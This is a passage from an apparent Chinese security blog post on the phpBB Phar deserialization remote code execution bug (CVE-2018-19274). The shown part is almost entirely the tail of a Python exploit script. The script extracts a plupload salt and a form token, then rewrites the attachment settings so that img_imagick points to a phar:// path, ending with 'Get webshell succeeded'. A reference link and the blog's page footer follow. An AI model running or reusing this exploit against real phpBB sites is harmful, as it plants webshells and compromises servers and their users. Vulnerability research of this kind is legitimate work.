    if &#39;phpBB Backup Script&#39; in html:
        print(&#39;Database download succeeded&#39;)
        matchObj = re.search(r&quot;\(&#39;plupload_salt&#39;, &#39;(.*?)&#39;, 0\)&quot;, html, re.M | re.I)
        if matchObj:
            plupload_salt = matchObj.group(1)
            print(&#39;Get the plupload_salt successfully ：&#123;plupload_salt&#125;&#39;.format(plupload_salt=plupload_salt))
        else:
            exit(&#39;Get the plupload_salt failed&#39;)
    else:
        exit(&#39;Database download failed&#39;)
    print(&#39;Calculate the name of the phar&#39;)

    name = &quot;&#123;plupload_salt&#125;_&#123;md5name&#125;zip.part&quot;.format(plupload_salt=plupload_salt, md5name=md5(upfilename))

    rs = r.get(target + &#39;/adm/index.php?i=acp_attachmenpartts&amp;mode=attach&amp;sid=&#39; + sid)
    html = rs.text
    soup = BeautifulSoup(html, &quot;html.parser&quot;)
    input = soup.find(&#39;input&#39;, attrs=&#123;&#39;name&#39;: &#39;form_token&#39;&#125;)
    form_token = input[&#39;value&#39;]
    print(&quot;Get form_token from Attachment settings：&#123;form_token&#125;&quot;.format(form_token=form_token))

    data = &quot;config%5Ballow_attachments%5D=1&amp;config%5Ballow_pm_attach%5D=0&amp;config%5Bupload_path%5D=files&amp;config%5Bdisplay_order%5D=0&amp;config%5Battachment_quota%5D=50&amp;attachment_quota=mb&amp;config%5Bmax_filesize%5D=256&amp;max_filesize=kb&amp;config%5Bmax_filesize_pm%5D=256&amp;max_filesize_pm=kb&amp;config%5Bmax_attachments%5D=3&amp;config%5Bmax_attachments_pm%5D=1&amp;config%5Bsecure_downloads%5D=0&amp;config%5Bsecure_allow_deny%5D=1&amp;config%5Bsecure_allow_empty_referer%5D=1&amp;config%5Bcheck_attachment_content%5D=1&amp;config%5Bimg_display_inlined%5D=1&amp;config%5Bimg_create_thumbnail%5D=0&amp;config%5Bimg_max_thumb_width%5D=400&amp;config%5Bimg_min_thumb_filesize%5D=12000&amp;config%5Bimg_imagick%5D=&#123;upfile&#125;&amp;config%5Bimg_max_width%5D=0&amp;config%5Bimg_max_height%5D=0&amp;config%5Bimg_link_width%5D=0&amp;config%5Bimg_link_height%5D=0&amp;submit=Submit&amp;ips=&amp;ipexclude=0&amp;creation_time=1552465991&amp;form_token=&#123;form_token&#125;&quot;.format(
        form_token=form_token,
        upfile=&#39;phar://../files/plupload/&#39; + name)
    rs = r.post(target + &#39;/adm/index.php?i=acp_attachments&amp;mode=attach&amp;sid=&#39; + sid, data=data)
    print(&#39;Get webshell succeeded&#39;)
</code></pre>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8239/#toc-3">https://xz.aliyun.com/t/8239\#toc-3</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/PhpBB/%EF%BC%88CVE-2018-19274%EF%BC%89PhpBB%20Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qu2f00dqy8v13z42b9g5" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/PhpBB/%EF%BC%88CVE-2019-13376%EF%BC%89PhpBB%E4%BB%8Esession%20id%E6%B3%84%E9%9C%B2%E5%88%B0CSRF%E5%88%B0XSS/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/php7cms/php7cms%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>